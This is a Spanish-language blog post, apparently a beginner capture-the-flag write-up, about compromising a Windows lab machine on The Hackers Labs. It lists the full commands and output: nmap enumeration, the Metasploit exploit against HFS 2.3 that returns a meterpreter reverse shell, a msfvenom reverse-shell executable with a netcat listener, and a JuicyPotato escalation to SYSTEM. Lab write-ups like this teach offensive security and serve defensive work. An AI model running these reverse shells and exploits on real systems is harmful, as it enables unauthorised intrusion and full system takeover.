<!DOCTYPE html>
<html lang="en">
  <head>
  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BNTQPFSFW4');
</script>

  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>murrusko | Espeto malagueño</title>
  
  <link rel="stylesheet" href="/assets/css/post.css" />
  <link rel="stylesheet" href="/assets/css/syntax.css" />
  
  <link rel="stylesheet" href="/assets/css/common.css" />
  <script src="/assets/js/categories.js"></script>
  <script>
    const currentTheme = localStorage.getItem("theme");
    if (currentTheme) {
      document.documentElement.setAttribute(
        "data-theme",
        localStorage.getItem("theme")
      );
    }
  </script>
  
  <script defer src="/assets/js/lbox.js"></script>
  
</head>

  <body>
    <main>
      <header>
  <a class="site-title" href="/">murrusko</a>
  <!-- dark/light mode -->
  <span id="dark-mode-toggle" style="cursor: pointer">
    <svg
      stroke="currentColor"
      fill="currentColor"
      stroke-width="0"
      viewBox="0 0 16 16"
      height="1.2em"
      width="1.2em"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
      ></path>
    </svg>
  </span>
</header>

      <section class="article">
        <div class="article-header">
          <h2 class="article-title">Espeto malagueño</h2>
          <small class="date">23 Jun 2024</small>
          <div class="categories">
            
            <a href="#!" class="category">thl</a>
            
            <a href="#!" class="category">ctf</a>
            
            <a href="#!" class="category">windows</a>
            
            <a href="#!" class="category">principiante</a>
            
          </div>
        </div>
        <div class="content"><p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:5b:2e:9c       PCS Systemtechnik GmbH
10.0.2.141      08:00:27:47:5a:9d       PCS Systemtechnik GmbH
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.141</code>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> , que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.141</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.141
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49158/tcp open  unknown
</code></pre></div></div>

<p>Una vez que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,139,445,5985,47001,49152,49153,49154,49155,49156,49158 <span class="nt">-v</span> 10.0.2.141
PORT      STATE SERVICE      VERSION
80/tcp    open  http         HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-time: 
|   <span class="nb">date</span>: 2024-06-23T13:28:01
|_  start_date: 2024-06-23T13:23:16
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: WIN-RE8NJPG9K5N, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:47:5a:9d <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
| Names:
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WIN-RE8NJPG9K5N&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|_  WIN-RE8NJPG9K5N&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|_clock-skew: mean: 4m43s, deviation: 0s, median: 4m43s

</code></pre></div></div>

<p>En el resultado vemos que en el puerto <code class="language-plaintext highlighter-rouge">80</code> hay un servidor <code class="language-plaintext highlighter-rouge">HFS 2.3</code> <code class="language-plaintext highlighter-rouge">(HTTP File Server)</code>.
<img src="/assets/images/espeto/1.png" alt="image" /></p>

<h1 id="intrusión">Intrusión</h1>

<p>Con <code class="language-plaintext highlighter-rouge">Metasploit</code> buscamos por si hubiera algún exploit disponible para esa versión.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search hfs 2.3

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                        Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                        <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1    <span class="se">\_</span> target: Automatic                      <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
   2    <span class="se">\_</span> target: Windows Powershell             <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
   3  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
</code></pre></div></div>

<p>Vemos que si que hay. Seleccionamos la opción 3 <code class="language-plaintext highlighter-rouge">use 3</code> y vemos las opciones disponibles que hay para el exploit con <code class="language-plaintext highlighter-rouge">options</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/windows/http/rejetto_hfs_exec<span class="o">)</span>:

   Name       Current Setting  Required  Description
   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   HTTPDELAY  10               no        Seconds to <span class="nb">wait </span>before terminating web server
   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS                      <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SRVHOST    0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host or network interface to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0 to listen on all
                                          addresses.
   SRVPORT    8080             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
   SSLCert                     no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
   TARGETURI  /                <span class="nb">yes       </span>The path of the web application
   URIPATH                     no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>
   VHOST                       no        HTTP server virtual host

Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LHOST     192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT     4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic

</code></pre></div></div>

<p>En nuestro caso cambiamos el Remote Host <code class="language-plaintext highlighter-rouge">set rhost 10.0.2.141</code> y el puerto que utiliza el exploit para hacer la explotación <code class="language-plaintext highlighter-rouge">set srvport 8081</code>. Ejecutamos el exploit con <code class="language-plaintext highlighter-rouge">exploit</code> y si todo ha salido bien, obtenemos una sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.0.2.141
rhosts <span class="o">=&gt;</span> 10.0.2.141
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>srvport 8081
srvport <span class="o">=&gt;</span> 8081
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.1.12:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using URL: http://192.168.1.12:8081/W4iYw9
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server started.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending a malicious request to /
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload request received: /W4iYw9
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>176198 bytes<span class="o">)</span> to 192.168.1.11
<span class="o">[!]</span> Tried to delete %TEMP%<span class="se">\U</span>nngBBbR.vbs, unknown result
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>192.168.1.12:4444 -&gt; 192.168.1.11:62032<span class="o">)</span> at 2024-06-23 15:32:58 +0200

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server stopped.

meterpreter <span class="o">&gt;</span> 

</code></pre></div></div>

<p>Vemos con que usuario estamos en el sistema con <code class="language-plaintext highlighter-rouge">getuid</code> y que privilegios tiene <code class="language-plaintext highlighter-rouge">getprivs</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> getuid
Server username: WIN-RE8NJPG9K5N<span class="se">\h</span>acker

meterpreter <span class="o">&gt;</span> getprivs

Enabled Process Privileges
<span class="o">==========================</span>

Name
<span class="nt">----</span>
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
</code></pre></div></div>

<p>Buscamos información del sistema con <code class="language-plaintext highlighter-rouge">sysinfo</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> sysinfo
Computer        : WIN-RE8NJPG9K5N
OS              : Windows Server 2012 R2 <span class="o">(</span>6.3 Build 9600<span class="o">)</span><span class="nb">.</span>
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Ahora nos queda obtener privilegios de administrador. Para ello, nos aprovechamos de los privilegios del usuario. En <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">hacktricks</a> vemos las diferentes posibilidades que tenemos. Yo voy a usar <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">JuicyPotato</a> para la escalada.</p>

<p>Descargamos <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20240621%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20240621T172808Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=cc316de6c04358d3f93c007d7c6ca6e16edc972949549ffce1471cc4526e01e0&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=142582717&amp;response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&amp;response-content-type=application%2Foctet-stream">JuicyPotato</a> :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
</code></pre></div></div>

<p>Creamos una shell reversa para windows con <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.2.5 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
</code></pre></div></div>

<p>Nos ponemos a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...

</code></pre></div></div>

<p>Subimos JuicyPotato y la shell que acamos de generar a la máquina victima. Después desde meterpreter abrimos una shell con <code class="language-plaintext highlighter-rouge">shell</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> upload JuicyPotato.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading  : /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 339.50 KiB of 339.50 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
meterpreter <span class="o">&gt;</span> upload shell.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading  : /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 72.07 KiB of 72.07 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
meterpreter <span class="o">&gt;</span> shell
Process 1192 created.
Channel 4 created.
Microsoft Windows <span class="o">[</span>Versi�n 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;

</code></pre></div></div>

<p>Ejecutamos JuicyPotato:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;.<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> .<span class="se">\s</span>hell.exe
.<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> .<span class="se">\s</span>hell.exe
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 443
....
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;

</code></pre></div></div>

<p>Y obtenemos la shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.141] 49171
Microsoft Windows <span class="o">[</span>Versi�n 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami 
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>
</div>
      </section>
      <footer>
  <p>&copy; 2024 | murrusko</p>
</footer>
<script src="/assets/js/mode.js" defer></script>

    </main>
    <section id="category-modal-bg"></section>
<section id="category-modal">
  <h1 id="category-modal-title"></h1>
  <section id="category-modal-content"></section>
</section>

  </body>
</html>
